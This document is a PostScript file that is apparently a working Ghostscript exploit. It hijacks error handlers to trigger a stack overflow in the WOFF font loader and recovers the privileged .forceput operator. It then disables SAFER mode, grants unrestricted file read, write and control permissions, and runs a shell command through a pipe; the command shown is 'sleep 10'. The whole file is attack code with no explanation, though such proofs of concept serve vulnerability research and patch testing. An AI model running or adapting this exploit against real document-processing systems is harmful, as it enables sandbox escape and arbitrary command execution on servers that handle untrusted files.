%!PS

%helpers from https://github.com/hhc0null/GhostRule/blob/master/ghostrule4.ps
/MaxFileSize 16#10000 def
/readfile {
  (r) file
  dup MaxFileSize string readstring pop
  exch closefile
} bind executeonly def

/osexec {
  (%pipe%) exch concatstrings readfile
} bind executeonly def








% safe original error handlers
/oldtypecheck errordict /typecheck get def
/oldundefined errordict /undefined get def
/oldstackoverflow errordict /stackoverflow get def
/oldunmatchedmark errordict /unmatchedmark get def

/typecheckcount 0 def

errordict /typecheck {} put
errordict /undefined {} put

/exploit {
  % .forceput is now contained in the stack, recover it
  % pstack
  6 index
  541 1 roll
  0 1 539 {pop pop} for
  3 get
  5 get
  10 get
  /forceput exch def % define /forceput
  
  % reset errordict
  errordict /typecheck {oldtypecheck} put
  errordict /stackoverflow {oldstacloverflow} put
  errordict /unmatchedmark {oldunmatchedmark} put
  
  % escape SAFER mode
  systemdict /SAFER false forceput
  userparams /LockFilePermissions false forceput
  systemdict /userparams get /PermitFileControl [(*)] forceput
  systemdict /userparams get /PermitFileWriting [(*)] forceput
  systemdict /userparams get /PermitFileReading [(*)] forceput
  save restore
   
  /Times-Bold findfont 36 scalefont setfont 200 200 moveto
  
  % execute arbitrary command
  (sleep 10) osexec
  dup print show
  showpage
  stop
} def

errordict /stackoverflow {
  % stack overflowed in .charkeys
  clear
  
  %ignore errors, for the most part
  %on 10th type error jump to exploit
  errordict /typecheck { /typecheckcount typecheckcount 1 add def typecheckcount 10 eq {exploit} if} put
  errordict /stackoverflow {} put
  errordict /undefined {oldundefined} put
  errordict /unmatchedmark {} put

  % make sure we don't crash
  /TTFDEBUG {true } def
  /glyphencoding {1 array} def
  /cmapsub {0} def
  /cmapa {0} def


  null null % prevent underflow

  %resume method
} put




%fill stack
0 1 298901 {} for

null

%get .loadwofffont
/.loadfontfile load
6 get 0 get


%executing .loadwofffont, will call stackoverflow handler
exec